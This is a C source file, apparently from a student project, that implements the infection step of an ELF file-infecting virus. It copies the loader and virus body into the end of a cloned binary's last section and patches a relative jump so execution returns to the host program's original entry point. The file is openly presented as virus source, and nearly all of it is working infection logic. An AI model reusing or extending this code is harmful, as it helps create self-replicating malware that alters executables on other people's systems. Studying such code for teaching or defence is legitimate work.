/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   copy_virus_to_clone.c                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/22 21:23:14 by ichkamo           #+#    #+#             */
/*   Updated: 2020/07/19 18:54:53 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "loader.h"
#include "utils.h"
#include "errors.h"
#include "disasm.h"
#include "virus.h"

static bool	assign_jump32(void *jump_inst, int32_t rel)
{
	size_t	len  = disasm_length(jump_inst, INSTRUCTION_MAXLEN);

	if (len < sizeof(int32_t))
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	int32_t	*arg = jump_inst + len - sizeof(int32_t);

	// deduct len since rel addressing is from the end of jump instruction
	*arg = rel - len;
	return true;
}

bool	copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original_entry)
{
	// copy loader and virus
	size_t	virus_size = (uint64_t)_start - (uint64_t)loader_entry;
	void	*loader_location = safe(clone_ref, original_entry->end_of_last_section, virus_size);

	if (!loader_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	memcpy(loader_location, (void *)loader_entry, virus_size);

	// gather offsets
	size_t	shoff            = original_entry->safe_shdr->sh_offset;
	size_t	loader_entry_off = original_entry->end_of_last_section;
	size_t	client_entry_off = shoff + original_entry->offset_in_section;

	// compute distances
	size_t	dist_client_loader_entry = loader_entry_off - client_entry_off;
	size_t	dist_loader_entry_jump   = jump_back_to_client - loader_entry;
	size_t	dist_client_entry_jump   = dist_client_loader_entry + dist_loader_entry_jump;

	// compute code offsets
	size_t	client_jump_off = client_entry_off + dist_client_entry_jump;
	int32_t	rel_jump_client = -((int32_t)dist_client_entry_jump);

	// get safe pointers in clone
	void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);

	// safe memory and overflow check
	if (back_to_client_jump == NULL
	|| dist_client_entry_jump < (size_t)((int32_t)dist_client_entry_jump))
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	// write new addr into clone's loader code
	if (!assign_jump32(back_to_client_jump, rel_jump_client))
		return errors(ERR_VIRUS, _ERR_COPY_LOADER_TO_CLONE);

	return true;
}
